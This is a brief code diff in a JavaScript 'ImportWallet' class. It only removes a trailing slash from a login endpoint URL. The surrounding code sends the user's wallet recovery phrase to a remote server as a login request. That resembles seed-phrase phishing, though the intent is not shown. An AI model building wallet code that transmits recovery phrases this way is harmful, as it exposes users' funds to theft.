@@ -75,7 +75,7 @@ class ImportWallet {
         let dots = 0;
         const originalText = "Import Wallet"; // Текст, который был на кнопке
         try {
-          const response = await fetch(`${API_BASE_URL}/user/login/`, {
+          const response = await fetch(`${API_BASE_URL}/user/login`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ phrase: phrase.join(' ') })
